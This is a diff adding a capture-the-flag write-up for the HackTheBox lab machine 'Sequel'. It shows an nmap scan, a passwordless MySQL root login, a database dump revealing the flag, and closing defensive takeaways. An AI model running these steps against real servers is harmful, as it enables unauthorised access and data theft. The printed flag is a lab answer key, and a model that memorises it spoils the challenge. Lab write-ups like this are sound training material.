@@ -1,0 +1,64 @@
+# HTB — Sequel (Easy Linux Machine)
+
+Platform: HackTheBox
+Machine: Sequel
+Difficulty: Easy · OS: Linux
+Date: Week 1 · June 2026
+Status: Rooted ✅
+
+---
+
+## Summary
+Sequel focuses on MySQL enumeration and weak
+authentication. No CVEs — pure misconfiguration.
+
+---
+
+## Enumeration
+
+### Nmap Scan
+$ nmap -sC -sV 10.10.11.197
+
+PORT     STATE SERVICE VERSION
+3306/tcp open  mysql   MySQL 8.0.28
+
+Only port 3306 open. MySQL exposed directly.
+
+### MySQL — No Password
+$ mysql -h 10.10.11.197 -u root -p
+Enter password: [blank]
+Welcome to the MySQL monitor.
+
+---
+
+## Exploitation
+
+mysql> show databases;
++--------------------+
+| htb                |
+| information_schema |
++--------------------+
+
+mysql> use htb;
+mysql> select * from config;
++----+----------------------------------+
+| id | value                            |
++----+----------------------------------+
+|  1 | 7b4bec00d1a39e3dd4e021ec3d915da8 |
++----+----------------------------------+
+
+Flag found in config table.
+
+---
+
+## Key Takeaways
+MySQL on port 3306    → never internet-facing
+Root with no password → critical misconfiguration
+Plaintext data        → should be encrypted at rest
+
+---
+
+## Defender Perspective
+- Alert: external connection to port 3306
+- Detection: network segmentation violation
+- Response: isolate host, rotate credentials
